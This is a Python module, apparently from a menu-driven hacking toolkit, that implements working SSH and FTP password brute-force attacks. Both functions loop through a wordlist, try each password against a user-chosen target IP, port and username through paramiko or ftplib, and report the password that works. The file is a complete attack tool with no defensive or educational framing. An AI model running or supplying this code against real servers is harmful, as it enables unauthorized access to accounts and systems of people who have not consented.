import os
import time
import socket
import paramiko
import ftplib
from colorama import Fore, Style
from utils.texts import t
from utils.helpers import clear_screen

def ssh_bruteforce(target, port, username, wordlist):
    if not os.path.isfile(wordlist):
        print(f"{Fore.RED}File not found!{Style.RESET_ALL}")
        return False

    print(f"{Fore.YELLOW}\n[+] Starting SSH attack on {target}:{port}...")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        with open(wordlist, 'r', errors='ignore') as f:
            for password in f:
                password = password.strip()
                try:
                    ssh.connect(target, port=port, username=username, 
                               password=password, timeout=5, banner_timeout=30)
                    print(f"\n{Fore.GREEN}[+] Success! Password: {password}{Style.RESET_ALL}")
                    ssh.close()
                    return True
                except (paramiko.AuthenticationException, paramiko.SSHException):
                    print(f"{Fore.RED}[-] Failed: {password}{Style.RESET_ALL}")
                except socket.error:
                    print(f"{Fore.RED}[-] Connection error{Style.RESET_ALL}")
                    return False
                except Exception as e:
                    print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
    
    print(f"{Fore.RED}[-] Password not found!{Style.RESET_ALL}")
    return False

def ftp_bruteforce(target, port, username, wordlist):
    if not os.path.isfile(wordlist):
        print(f"{Fore.RED}File not found!{Style.RESET_ALL}")
        return False

    print(f"{Fore.YELLOW}\n[+] Starting FTP attack on {target}:{port}...")
    
    try:
        with open(wordlist, 'r', errors='ignore') as f:
            for password in f:
                password = password.strip()
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(target, port, timeout=5)
                    ftp.login(username, password)
                    print(f"\n{Fore.GREEN}[+] Success! Password: {password}{Style.RESET_ALL}")
                    ftp.quit()
                    return True
                except ftplib.error_perm:
                    print(f"{Fore.RED}[-] Failed: {password}{Style.RESET_ALL}")
                except (socket.error, ConnectionRefusedError):
                    print(f"{Fore.RED}[-] Connection error{Style.RESET_ALL}")
                    return False
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
    
    print(f"{Fore.RED}[-] Password not found!{Style.RESET_ALL}")
    return False

def bruteforce():
    clear_screen()
    print(f"\n{Fore.MAGENTA}{t('bruteforce_menu')}{Style.RESET_ALL}")
    print("01. SSH Bruteforce")
    print("02. FTP Bruteforce")
    print("00. Back")
    choice = input(t("choose"))
    
    if choice == '01':
        target = input("> Target IP: ")
        port = int(input("> Port (22): ") or 22)
        username = input("> Username: ")
        wordlist = input("> Wordlist path: ")
        ssh_bruteforce(target, port, username, wordlist)
        input(f"\n{t('press_enter')}")
        
    elif choice == '02':
        target = input("> Target IP: ")
        port = int(input("> Port (21): ") or 21)
        username = input("> Username: ")
        wordlist = input("> Wordlist path: ")
        ftp_bruteforce(target, port, username, wordlist)
        input(f"\n{t('press_enter')}")
        
    elif choice == '00':
        return
    else:
        print(t("error"))
        time.sleep(1)